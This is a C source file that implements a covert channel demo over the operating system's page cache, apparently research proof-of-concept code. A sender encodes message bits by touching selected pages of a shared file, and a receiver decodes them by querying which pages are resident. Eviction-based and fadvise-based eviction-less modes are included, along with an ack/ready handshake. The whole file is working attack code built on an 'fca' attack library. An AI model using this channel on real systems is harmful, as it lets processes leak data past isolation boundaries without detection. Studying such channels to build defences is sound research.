/*-----------------------------------------------------------------------------
 * main.c
 *
 * A program demonstrating the exploitation of a covert channel based on
 * virtual memory and shared memory. To run this demo program you should have
 * swapping disabled. 
 * 
 * Start the receiver first!
 * 
 *
 * Usage: ./covert_channel [message + ack file] [ready file] [-s|-r] <-t RUNS>
 *
 *	-s
 *		 Send mode.
 * 
 *	-r
 *		 Receive mode.
 *
 *	-t RUNS
 *		 Test mode, performs RUNS transmission cycles.
 *
 * NOTE For evaluation with the attack working set enabled the attacker binary should be stored
 *      somewhere in the search paths so that it is also added to the attack working set.
 * 
 * Erik Kraft
 */

#define _GNU_SOURCE 1 
/*-----------------------------------------------------------------------------
 * INCLUDES
 */
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef __linux
#include <signal.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#elif defined(_WIN32)
#include "windows.h"
#endif
#include "tsc_bench.h"
#include "cmdline.h"
#include "filemap.h"
#include "config.h"
#include "fca.h"
#include "osal.h"
#include "debug.h"

/*-----------------------------------------------------------------------------
 * DEFINES
 */

// eviction-less covert channel on linux
#define MESSAGE_FILE_SIZE (MESSAGE_SIZE * 8 * PAGE_SIZE)
#if defined(EVICTION_LESS) && defined(__linux)
#define MESSAGE_ACK_FILE_SIZE (MESSAGE_FILE_SIZE + PAGE_SIZE)
#define ACK_PAGE_OFFSET (MESSAGE_SIZE * 8)
#define READY_FILE_SIZE (PAGE_SIZE)
#define READY_PAGE_OFFSET (0)
// eviction-based covert channel on linux
#else 
#define TRANSMISSION_FILE_SIZE ((MESSAGE_SIZE * 8 + 3) * PAGE_SIZE)
#define ACK_PAGE_OFFSET (MESSAGE_SIZE * 8)
const size_t READY_PAGE_OFFSET[2] = {MESSAGE_SIZE * 8 + 1, MESSAGE_SIZE * 8 + 2};
#endif
#define SEND_TRACE_FILE "snd_trace.bin"
#define RECEIVE_TRACE_FILE "rcv_trace.bin"

// defines used for parsing command line arguments
#define SWITCHES_COUNT 4
#define SEND_SWITCH 0
#define RECEIVE_SWITCH 1
#define TEST_SWITCH 2
#define FCA_WINDOWS_BS_SWITCH 3
const char *SWITCHES_STR[SWITCHES_COUNT] = {"-s", "-r", "-t", "-b"};
const size_t SWITCHES_ARG_COUNT[SWITCHES_COUNT] = {0, 0, 1, 1};
#if defined(EVICTION_LESS) && defined(__linux)
#define MANDATORY_ARGS 2
#define MANDATORY_ARGS_USAGE "[message + ack file] [ready file]"
#else
#define MANDATORY_ARGS 1
#define MANDATORY_ARGS_USAGE "[transmission file]"
#endif 

#define TRANSMISSION_FILE_PATH_ARG 0
#define TRANSMISSION_READY_FILE_PATH_ARG 1
#define USAGE_MSG "Usage: %s " MANDATORY_ARGS_USAGE " [-s|-r] <-t RUNS>\n\n"     \
                  "\t-s\n"                                                      \
                  "\t\t Send mode.\n\n"                                         \
                  "\t-r\n"                                                      \
                  "\t\t Receive mode.\n\n"                                      \
                  "\t-t RUNS\n"                                                 \
                  "\t\t Test mode, performs RUNS transmission cycles.\n\n"                          

// output TAGS with ANSI colors
#define PENDING "\x1b[34;1m[PENDING]\x1b[0m "
#define INFO "\x1b[34;1m[INFO]\x1b[0m "
#define EVENT "\x1b[33;1m[EVENT]\x1b[0m "
#define OK "\x1b[32;1m[OK]\x1b[0m "
#define FAIL "\x1b[31;1m[FAIL]\x1b[0m "
#define USAGE "\x1b[31;1m[USAGE]\x1b[0m "
#define WARNING "\x1b[33;1m[WARNING]\x1b[0m "

/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */
static void configAttackFromDefines(Attack *attack);
#ifdef EVICTION_LESS
#ifdef __linux
static int sendBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *data);
static int receiveBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *data);
static int cacheRemoveFilePages(FileMapping *mapping, size_t offset, size_t len);
#elif defined(_WIN32)
#endif
#else 
int sendBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data);
int receiveBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data);
#endif
static void usageError(char *app_name);

/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static int running = 1;
static size_t PAGE_SIZE = 0;

/*-----------------------------------------------------------------------------
 * SIGNAL HANDLERS
 */
#ifdef __linux
static void quitHandler(int signal)
{
    // __ATOMIC_RELAXED = no thread ordering constraints
    __atomic_store_n(&running, 0, __ATOMIC_RELAXED);
}
#elif defined (_WIN32)
static BOOL WINAPI CtrlHandler(DWORD ctrl_type)
{
    if(ctrl_type == CTRL_C_EVENT)
    {
        // __ATOMIC_RELAXED = no thread ordering constraints
        __atomic_store_n(&running, 0, __ATOMIC_RELAXED);
        return TRUE;
    }   
    return FALSE;
}
#endif

/*-----------------------------------------------------------------------------
 * CODE
 */
// TODO  windows
int main(int argc, char *argv[])
{
    // general variables
    int ret = 0;
    volatile uint8_t tmp = 0;
#ifdef __linux
    struct sigaction quit_act = {0};
#elif defined (_WIN32)
    // TODO
#endif

    // variables used for processing command line arguments
    CmdLineConf cmd_line_conf =
    {
        .mandatory_args_count_ = MANDATORY_ARGS,
        .switches_count_ = SWITCHES_COUNT,
        .switches_ = SWITCHES_STR,
        .switches_arg_count_ = SWITCHES_ARG_COUNT
    };
    CmdLineParsed parsed_cmd_line;

    // variables necessary for general attack function
    uint64_t cycle = 0;
    uint64_t timestamp = 0;
    uint8_t *message_buffer = NULL;
    Attack attack = {0};
    FileMapping self_mapping = {0};
#if defined(EVICTION_LESS) && defined(__linux)
    TargetFile *message_ack_file;
    TargetFile *ready_file;
#else 
    TargetFile *transmission_file;
#endif
    uint64_t test_run = 0;
    uint64_t test_runs = 0;
    FILE *test_trace_file = NULL;

    // initialise file mappings
    initFileMapping(&self_mapping);

    // set output buffering to lines (needed for automated testing)
    setvbuf(stdout, NULL, _IOLBF, 0);

    // process command line arguments
    if (parseCmdArgs(&argv[1], argc - 1, &cmd_line_conf, &parsed_cmd_line) != 0)
    {
        usageError(argv[0]);
        goto error;
    }
    if(!parsed_cmd_line.switch_states_[SEND_SWITCH] && 
        !parsed_cmd_line.switch_states_[RECEIVE_SWITCH])
    {
        usageError(argv[0]);
        goto error;
    }

    // get system page size
    PAGE_SIZE = osal_get_page_size();
    if(PAGE_SIZE == -1)
    {
        printf("Error " OSAL_EC_FS " at osal_get_page_size...\n", OSAL_EC);
        goto error;
    }

    // register signal handler for quiting the program by SRTG+C
#ifdef __linux
    quit_act.sa_handler = quitHandler;
    ret = sigaction(SIGINT, &quit_act, NULL);
    ret += sigaction(SIGQUIT, &quit_act, NULL);
    ret += sigaction(SIGUSR1, &quit_act, NULL);
    if (ret != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at sigaction...\n", OSAL_EC);
        goto error;
    }
#elif defined(_WIN32)
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) 
    {
        printf(FAIL "Error " OSAL_EC_FS " at SetConsoleCtrlHandler...\n", OSAL_EC);
        goto error;   
    }
#endif

    // initialise tsc bench lib
    if(tsc_bench_init(0) != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at tsc_bench_init...\n", OSAL_EC);
        goto error;        
    }

    // allocate message buffer
    message_buffer = calloc(MESSAGE_SIZE + 1, sizeof(uint8_t));
    if(message_buffer == NULL)
    {
        printf(FAIL "Error " OSAL_EC_FS " at malloc...\n", OSAL_EC);
        goto error;        
    }

    // initialising attack
    if (fcaInit(&attack) != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at fcaInit...\n", OSAL_EC);
        goto error;
    }

    // optional: mlock self
#ifdef MLOCK_SELF
    // map self
    if (mapFile(&self_mapping, argv[0], 
        FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | MAPPING_ACCESS_READ | MAPPING_ACCESS_EXECUTE) != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at mapFile for: %s...\n", OSAL_EC, argv[0]);
        goto error;
    }
    // mlock self
#ifdef __linux
    ret = mlock(self_mapping.addr_, self_mapping.size_);
    if (ret != 0)
    {
        printf(WARNING "Error " OSAL_EC_FS " at mlock for: %s...\n", OSAL_EC, argv[0]);
    }
#elif defined(_WIN32)
    if(!VirtualLock(self_mapping.addr_, self_mapping.size_))
    {
        printf(WARNING "Error " OSAL_EC_FS " at VirtualLock for: %s...\n", OSAL_EC, argv[0]);
    }
#endif
#endif

    // sample configuration
    configAttackFromDefines(&attack);

// does not use eviction-based approach
#if defined(EVICTION_LESS) && defined(__linux)
    // change file cache state sample function
    if (changeFcStateSource(attack.fc_state_source_) != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at changeFcStateSource...\n", OSAL_EC);
        goto error;
    }
    
    // create covert channel files if they do not exist
    ret= createRandomFile(parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG], MESSAGE_ACK_FILE_SIZE);
    if (ret != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at createRandomFile for: %s...\n", OSAL_EC, 
            parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG]);
        goto error;
    }
    ret = createRandomFile(parsed_cmd_line.mandatory_args_[TRANSMISSION_READY_FILE_PATH_ARG], READY_FILE_SIZE);
    if (ret != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at createRandomFile for: %s...\n", OSAL_EC, 
            parsed_cmd_line.mandatory_args_[TRANSMISSION_READY_FILE_PATH_ARG]);
        goto error;
    }

    // add target files
    message_ack_file = fcaAddTargetFile(&attack, parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG]);
    if(message_ack_file == NULL)
    {
        printf(FAIL "Error " OSAL_EC_FS " at fcaAddTargetFile for: %s...\n", OSAL_EC, 
            parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG]);
        goto error;
    }
    ready_file = fcaAddTargetFile(&attack, parsed_cmd_line.mandatory_args_[TRANSMISSION_READY_FILE_PATH_ARG]);
    if(ready_file == NULL)
    {
        printf(FAIL "Error " OSAL_EC_FS " at fcaAddTargetFile for: %s...\n", OSAL_EC, 
            parsed_cmd_line.mandatory_args_[TRANSMISSION_READY_FILE_PATH_ARG]);
        goto error;
    }

    // configure target files
    message_ack_file->has_target_sequence_ = 1;
    message_ack_file->target_sequence_.offset_ = 0;
    message_ack_file->target_sequence_.length_ = MESSAGE_ACK_FILE_SIZE / PAGE_SIZE;

    ready_file->has_target_sequence_ = 1;
    ready_file->target_sequence_.offset_ = 0;
    ready_file->target_sequence_.length_ = READY_FILE_SIZE / PAGE_SIZE;

    // receive mode 
    if(parsed_cmd_line.switch_states_[RECEIVE_SWITCH]) 
    {
        // remove any cached content if exists
        if(cacheRemoveFilePages(&message_ack_file->mapping_, 0, MESSAGE_ACK_FILE_SIZE) != 0 ||
            cacheRemoveFilePages(&ready_file->mapping_, 0, READY_FILE_SIZE) != 0)
        {
            printf(FAIL "Error " OSAL_EC_FS " at cacheRemoveFilePages...\n", OSAL_EC);
            goto error;            
        }

        // initial access of ack page
        tmp += *((uint8_t *) message_ack_file->mapping_.addr_ + ACK_PAGE_OFFSET * PAGE_SIZE);

        // initially unmap message + ack file
        closeMappingOnly(&message_ack_file->mapping_);
    }
// does use eviction-based approach
#else 
    // create transmission file if they do not exist
    ret= createRandomFile(parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG], TRANSMISSION_FILE_SIZE);
    if (ret != 0)
    {
        printf(FAIL "Error " OSAL_EC_FS " at createRandomFile for: %s...\n", OSAL_EC, 
            parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG]);
        goto error;
    }

    // add target files
    transmission_file = fcaAddTargetFile(&attack, parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG]);
    if(transmission_file == NULL)
    {
        printf(FAIL "Error " OSAL_EC_FS " at fcaAddTargetFile for: %s...\n", OSAL_EC, 
            parsed_cmd_line.mandatory_args_[TRANSMISSION_FILE_PATH_ARG]);
        goto error;
    }

    // configure target files
    transmission_file->has_target_sequence_ = 1;
    transmission_file->target_sequence_.offset_ = 0;
    transmission_file->target_sequence_.length_ = TRANSMISSION_FILE_SIZE / PAGE_SIZE;

    // receive mode 
    if(parsed_cmd_line.switch_states_[RECEIVE_SWITCH]) 
    {
        // initial access of ack page
        tmp += *((uint8_t *) transmission_file->mapping_.addr_ + ACK_PAGE_OFFSET * PAGE_SIZE);
    }
    else 
    {
        // start fca attack
        if(fcaStart(&attack, 0) != 0)
        {
            printf(FAIL "Error " OSAL_EC_FS " at fcaStart...\n", OSAL_EC);
            goto error;
        }
    }
#endif
    printf(INFO "Initial working set now consists of %zu files (%zu bytes mapped).\n",
        attack.working_set_.resident_files_[attack.working_set_.up_to_date_list_set_].count_,
        attack.working_set_.mem_in_ws_[attack.working_set_.up_to_date_list_set_]);
    printf(OK "Ready...\n\n");
    
    // covert channel transmission log
    if(parsed_cmd_line.switch_states_[TEST_SWITCH])
    {
        test_runs = atoi(parsed_cmd_line.switch_args_[TEST_SWITCH][0]);
        if(parsed_cmd_line.switch_states_[SEND_SWITCH])
        {
            test_trace_file = fopen(SEND_TRACE_FILE, "wb");
        }
        else if(parsed_cmd_line.switch_states_[RECEIVE_SWITCH])
        {
            test_trace_file = fopen(RECEIVE_TRACE_FILE, "wb");
        }
        if(test_trace_file == NULL) 
        {
            printf(FAIL "Error " OSAL_EC_FS " at fopen...\n", OSAL_EC);
            goto error;
        }
        uint64_t message_size = MESSAGE_SIZE;
        if(fwrite(&message_size, sizeof(uint64_t), 1, test_trace_file) != 1)
        {
            printf(FAIL "Error " OSAL_EC_FS " at fwrite...\n", OSAL_EC);
            goto error;            
        }
        if(fwrite(&test_runs, sizeof(uint64_t), 1, test_trace_file) != 1)
        {
            printf(FAIL "Error " OSAL_EC_FS " at fwrite...\n", OSAL_EC);
            goto error;            
        }
    }

    // main event loop
    if(parsed_cmd_line.switch_states_[SEND_SWITCH])
    {
        printf(INFO "Sender started at UNIX timestamp: %zu us\n", osal_unix_ts_us());
        while (running && (test_runs == 0 || test_run < test_runs))
        {
            if(parsed_cmd_line.switch_states_[TEST_SWITCH])
            {
                if(osal_get_random(message_buffer, MESSAGE_SIZE) != MESSAGE_SIZE)
                {
                    printf(FAIL "Error " OSAL_EC_FS " at fcaStart...\n", OSAL_EC);
                    goto error;                
                }
            }
            else 
            {
                memset(message_buffer, 0, MESSAGE_SIZE);
                printf("Message> ");
                if(fgets((char *) message_buffer, MESSAGE_SIZE, stdin) == NULL)
                {
                    printf(FAIL "Error " OSAL_EC_FS " at fgets...\n", OSAL_EC);
                    goto error;                       
                }
            }

            // different send functions
            TSC_BENCH_START(cycle);
            timestamp = tsc_bench_get_raw_timestamp_ns(cycle);
#ifdef EVICTION_LESS
#ifdef __linux
            ret = sendBlock(message_ack_file, ready_file, message_buffer);
#elif defined(_WIN32)
#endif
#else
            ret = sendBlock(&attack, transmission_file, message_buffer);
#endif
            if(ret == -1)
            {
                printf(FAIL "Error " OSAL_EC_FS " at sendBlock...\n", OSAL_EC);
                goto error;    
            }

            if(parsed_cmd_line.switch_states_[TEST_SWITCH])
            {
                if(fwrite(&timestamp, sizeof(uint64_t), 1, test_trace_file) != 1)
                {
                    printf(FAIL "Error " OSAL_EC_FS " at fwrite...\n", OSAL_EC);
                    goto error;            
                }
                if(fwrite(message_buffer, sizeof(uint8_t), MESSAGE_SIZE, test_trace_file) != MESSAGE_SIZE)
                {
                    printf(FAIL "Error " OSAL_EC_FS " at fwrite...\n", OSAL_EC);
                    goto error;            
                }
#ifdef __linux
                fsync(fileno(test_trace_file));
#endif                 
            }

            test_run++;
        }
    }
    else if(parsed_cmd_line.switch_states_[RECEIVE_SWITCH])
    {
        while (running && (test_runs == 0 || test_run < test_runs))
        {
            // different receive functions
#ifdef EVICTION_LESS
#ifdef __linux
            ret = receiveBlock(message_ack_file, ready_file, message_buffer);
#elif defined(_WIN32)
#endif
#else
            ret = receiveBlock(&attack, transmission_file, message_buffer);
#endif
            TSC_BENCH_STOP(cycle);
            timestamp = tsc_bench_get_runtime_ns(0, cycle);
            if(ret == -1)
            {
                printf(FAIL "Error " OSAL_EC_FS " at receiveBlock...\n", OSAL_EC);
                goto error;    
            }

            if(parsed_cmd_line.switch_states_[TEST_SWITCH])
            {
                if(fwrite(&timestamp, sizeof(uint64_t), 1, test_trace_file) != 1)
                {
                    printf(FAIL "Error " OSAL_EC_FS " at fwrite...\n", OSAL_EC);
                    goto error;            
                }
                if(fwrite(message_buffer, sizeof(uint8_t), MESSAGE_SIZE, test_trace_file) != MESSAGE_SIZE)
                {
                    printf(FAIL "Error " OSAL_EC_FS " at fwrite...\n", OSAL_EC);
                    goto error;            
                } 
#ifdef __linux
                fsync(fileno(test_trace_file));
#endif                
            }
            else 
            {
                printf("%s\n", message_buffer);
            }

            test_run++;
        }
        printf(INFO "Receiver stopped at UNIX timestamp: %zu us\n", osal_unix_ts_us());
    }

    goto cleanup;
error:
    ret = -1;

cleanup:
    fcaExit(&attack);
    if(test_trace_file != NULL)
    {
        fclose(test_trace_file);
    }
    free(message_buffer);
#ifdef MLOCK_SELF
    closeFileMapping(&self_mapping);
#endif
    freeCmdLineParsed(&cmd_line_conf, &parsed_cmd_line);

    return ret;
}

#ifdef __linux
void configAttackFromDefines(Attack *attack)
{
    // General
    attack->use_attack_bs_ = DEF_USE_ATTACK_BS;
    attack->use_attack_ws_ = DEF_USE_ATTACK_WS;
    attack->use_attack_ss_ = DEF_USE_ATTACK_SS;
    
    attack->fc_state_source_ = DEF_FC_STATE_SOURCE;
    attack->fa_window_size_pages_ = DEF_FA_WINDOW_SIZE_PAGES;

    // Eviction Set
    attack->eviction_set_.use_anon_memory_ = DEF_ES_USE_ANON_MEMORY;
    attack->eviction_set_.use_access_threads_ = DEF_ES_USE_ACCESS_THREADS;
    attack->eviction_set_.use_file_api_ = DEF_ES_USE_FILE_API;
    attack->eviction_set_.eviction_file_path_ = DEF_ES_EVICTION_FILE_PATH;
    attack->eviction_set_.targets_check_all_x_bytes_ = DEF_ES_TARGETS_CHECK_ALL_X_BYTES;
    attack->eviction_set_.ws_access_all_x_bytes_ = DEF_ES_WS_ACCESS_ALL_X_BYTES;
    attack->eviction_set_.ss_access_all_x_bytes_ = DEF_ES_SS_ACCESS_ALL_X_BYTES;
    attack->eviction_set_.prefetch_es_bytes_ = DEF_ES_PREFETCH_ES_BYTES;
    // only if .use_access_threads_ is set
    attack->eviction_set_.access_thread_count_ = DEF_ES_ACCESS_THREAD_COUNT;

    // Blocking Set
    attack->blocking_set_.def_fillup_size_ = DEF_BS_FILLUP_SIZE;
    attack->blocking_set_.min_available_mem_ = DEF_BS_MIN_AVAILABLE_MEM;
    attack->blocking_set_.max_available_mem_ = DEF_BS_MAX_AVAILABLE_MEM;
    attack->blocking_set_.evaluation_sleep_time_us_ = DEF_BS_EVALUATION_SLEEP_TIME_US;

    // Working Set
    attack->working_set_.evaluation_ = DEF_WS_EVALUATION;
    attack->working_set_.eviction_ignore_evaluation_ = DEF_WS_EVICTION_IGNORE_EVALUATION;
    attack->working_set_.use_file_api_ = DEF_WS_USE_FILE_API;
    attack->working_set_.search_paths_ = DEF_WS_SEARCH_PATHS;
    attack->working_set_.ps_add_threshold_ = DEF_WS_PS_ADD_THRESHOLD;
    attack->working_set_.access_sleep_time_us_= DEF_WS_ACCESS_SLEEP_TIME_US;
    attack->working_set_.evaluation_sleep_time_us_ = DEF_WS_EVALUATION_SLEEP_TIME_US;
    attack->working_set_.profile_update_all_x_evaluations_ = DEF_WS_PROFILE_UPDATE_ALL_X_EVALUATIONS;
    attack->working_set_.access_thread_count_ = DEF_WS_ACCESS_THREAD_COUNT;

    // Suppress Set
    attack->suppress_set_.use_file_api_ = DEF_SS_USE_FILE_API;
    attack->suppress_set_.access_sleep_time_us_ = DEF_SS_ACCESS_SLEEP_TIME_US;
    attack->suppress_set_.access_thread_count_ = DEF_SS_ACCESS_THREAD_COUNT;
}
#elif defined(_WIN32)
    // TODO 
#endif

#ifdef EVICTION_LESS
#ifdef __linux
int sendBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *data)
{
    int ret = 0;
    volatile uint8_t tmp = 0;
    uint8_t ack_status = 0;
    char mask = 1;

    DEBUG_PRINT((DEBUG "Sender: Wait for ack.\n"));
    // wait for ack
    do
    {
        getCacheStatusFilePage(&message_ack_file->mapping_, ACK_PAGE_OFFSET * PAGE_SIZE, &ack_status);
    } while (!(ack_status & 1) && running);
    DEBUG_PRINT((DEBUG  "Sender: Got ack.\n"));

    // remove message + ack file pages
    if(cacheRemoveFilePages(&message_ack_file->mapping_, 0, MESSAGE_ACK_FILE_SIZE) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at cacheRemoveFilePages...\n", OSAL_EC)); 
        goto error;
    }

    // prefetch first (might benefit from asynchronous disk loads)
    for (size_t p = 0, b = 0; p < MESSAGE_FILE_SIZE / PAGE_SIZE; p++)
    {
        if (data[b] & mask)
        {
            readahead(message_ack_file->mapping_.internal_.fd_, p * PAGE_SIZE, PAGE_SIZE);
        }

        mask = mask << 1;
        if (!mask)
        {
            mask = 1;
            b++;
        }
    }
    // access pages
    for (size_t p = 0, b = 0; p < MESSAGE_FILE_SIZE / PAGE_SIZE; p++)
    {
        if (data[b] & mask)
        {
            tmp += *((uint8_t *) message_ack_file->mapping_.addr_ + p * PAGE_SIZE);
        }

        mask = mask << 1;
        if (!mask)
        {
            mask = 1;
            b++;
        }
    }

    // (re)map ready file
    if(mapFile(&ready_file->mapping_, "", FILE_ACCESS_READ | FILE_ACCESS_EXECUTE, MAPPING_SHARED | 
        MAPPING_ACCESS_READ) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapFile...\n", OSAL_EC)); 
        goto error;
    }

    // send ready
    tmp += *((uint8_t *) ready_file->mapping_.addr_ + READY_PAGE_OFFSET * PAGE_SIZE);
    DEBUG_PRINT((DEBUG "Sender: Send message + ready.\n"));

    goto cleanup;
error:
    ret = -1;

cleanup:
    // unmap ready file
    // (so that fadvise + madvise by other party are guaranteed to work)
    closeMappingOnly(&ready_file->mapping_);
    return ret;
}

int receiveBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *data)
{
    int ret = 0;
    volatile uint8_t tmp = 0;
    uint8_t ready_status = 0;
    char mask = 1;
    char byte = 0;

    DEBUG_PRINT((DEBUG "Receiver: Wait for ready.\n"));
    do
    {
        getCacheStatusFilePage(&ready_file->mapping_, READY_PAGE_OFFSET * PAGE_SIZE, &ready_status);
    } while (!(ready_status & 1) && running);
    DEBUG_PRINT((DEBUG "Receiver: Got ready.\n"));

    // remove ready file pages
    if(cacheRemoveFilePages(&ready_file->mapping_, 0, READY_FILE_SIZE) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at cacheRemoveFilePages...\n", OSAL_EC)); 
        goto error;
    }

    // (re)map message + ack file
    if(mapFile(&message_ack_file->mapping_, "", FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | 
        MAPPING_ACCESS_READ) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapFile...\n", OSAL_EC)); 
        goto error;
    }

    // get message
    getCacheStatusFileRange(&message_ack_file->mapping_, 0, MESSAGE_FILE_SIZE);
    for (size_t p = 0, b = 0; p < MESSAGE_FILE_SIZE / PAGE_SIZE; p++)
    {
        if (message_ack_file->mapping_.pages_cache_status_[p] & 1)
        {
            byte |= mask;
        }

        mask = mask << 1;
        if (!mask)
        {
            data[b] = byte;

            b++;
            byte = 0;
            mask = 1;
        }
    }

    // send ack
    tmp += *((uint8_t *) message_ack_file->mapping_.addr_ + ACK_PAGE_OFFSET * PAGE_SIZE);
    DEBUG_PRINT((DEBUG "Receiver: Send ack.\n"));

    goto cleanup;
error:
    ret = -1;

cleanup:
    // unmap message + ack file 
    // (so that fadvise + madvise by other party are guaranteed to work)
    closeMappingOnly(&message_ack_file->mapping_);
    return ret;
}

int cacheRemoveFilePages(FileMapping *mapping, size_t offset, size_t len)
{
    // remove pages eviction less
    // (only works if the pages are only used by one process)
    do
    {
        // hint DONTNEED
        // (removes pages from cache if only one process uses them)
        if(adviseFileUsage(mapping, offset, len, USAGE_DONTNEED) != 0)
        {
            return -1;
        }
        // check if pages are really removed
        if(getCacheStatusFileRange(mapping, offset, len) != 0)
        {
            return -1;
        }
        osal_sched_yield();
    } while (fcaCountCachedPages(mapping->pages_cache_status_ + (offset / PAGE_SIZE), len / PAGE_SIZE) != 0);
    // hint random access (no readahead)
    if(adviseFileUsage(mapping, offset, len, USAGE_RANDOM) != 0)
    {
        return -1;
    }
    
    return 0;
}
#elif defined (_WIN32)

#endif
#else 
int sendBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data)
{
    int ret = 0;
    static int even = 0;
    volatile uint8_t tmp = 0;
    uint8_t ack_status = 0;
    char mask = 1;

    DEBUG_PRINT((DEBUG "Sender: Wait for ack.\n"));
    // wait for ack
    do
    {
        getCacheStatusFilePage(&transmission_file->mapping_, ACK_PAGE_OFFSET * PAGE_SIZE, &ack_status);
    } while (!(ack_status & 1) && running);
    DEBUG_PRINT((DEBUG  "Sender: Got ack.\n"));

    // remove transmission file pages
    if(fcaTargetsSampleFlushOnce(attack) == -1)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at fcaTargetsSampleFlushOnce...\n", OSAL_EC)); 
        goto error;
    }

    // prefetch first (might benefit from asynchronous disk loads)
    for (size_t p = 0, b = 0; p < MESSAGE_FILE_SIZE / PAGE_SIZE; p++)
    {
        if (data[b] & mask)
        {
#ifdef __linux
            readahead(transmission_file->mapping_.internal_.fd_, p * PAGE_SIZE, PAGE_SIZE);
#endif
        }

        mask = mask << 1;
        if (!mask)
        {
            mask = 1;
            b++;
        }
    }
    // access pages
    for (size_t p = 0, b = 0; p < MESSAGE_FILE_SIZE / PAGE_SIZE; p++)
    {
        if (data[b] & mask)
        {
            tmp += *((uint8_t *) transmission_file->mapping_.addr_ + p * PAGE_SIZE);
        }

        mask = mask << 1;
        if (!mask)
        {
            mask = 1;
            b++;
        }
    }

    // send ready, advance to next ready
    tmp += *((uint8_t *) transmission_file->mapping_.addr_ + READY_PAGE_OFFSET[even] * PAGE_SIZE);
    even ^= 1;
    DEBUG_PRINT((DEBUG "Sender: Send message + ready.\n"));

    goto cleanup;
error:
    ret = -1;

cleanup:
    return ret;
}

int receiveBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data)
{
    int ret = 0;
    static int even = 0;
    volatile uint8_t tmp = 0;
    uint8_t ready_status = 0;
    char mask = 1;
    char byte = 0;

    DEBUG_PRINT((DEBUG "Receiver: Wait for ready %d.\n", even));
    do
    {
        getCacheStatusFilePage(&transmission_file->mapping_, READY_PAGE_OFFSET[even] * PAGE_SIZE, &ready_status);
    } while (!(ready_status & 1) && running);
    DEBUG_PRINT((DEBUG "Receiver: Got ready %d.\n", even));

    // get message
    getCacheStatusFileRange(&transmission_file->mapping_, 0, MESSAGE_FILE_SIZE);
    for (size_t p = 0, b = 0; p < MESSAGE_FILE_SIZE / PAGE_SIZE; p++)
    {
        if (transmission_file->mapping_.pages_cache_status_[p] & 1)
        {
            byte |= mask;
        }

        mask = mask << 1;
        if (!mask)
        {
            data[b] = byte;

            b++;
            byte = 0;
            mask = 1;
        }
    }

    // advance to next ready
    even ^= 1;
    // send ack
    tmp += *((uint8_t *) transmission_file->mapping_.addr_ + ACK_PAGE_OFFSET * PAGE_SIZE);
    DEBUG_PRINT((DEBUG "Receiver: Send ack.\n"));

//    goto cleanup;
//error:
//    ret = -1;

//cleanup:
    return ret;
}
#endif

void usageError(char *app_name)
{
    printf(USAGE USAGE_MSG, app_name);
}
